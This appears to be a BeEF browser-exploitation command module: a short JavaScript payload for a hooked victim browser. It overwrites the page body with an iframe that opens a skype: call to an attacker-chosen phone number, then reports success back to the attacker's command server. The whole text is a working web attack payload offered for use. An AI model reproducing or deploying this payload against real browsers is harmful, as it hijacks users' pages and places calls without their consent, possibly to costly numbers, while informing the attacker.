beef.execute(function() {
	document.body.innerHTML = "<iframe src=skype:<%= @tel_num %>?call></iframe>";

    beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
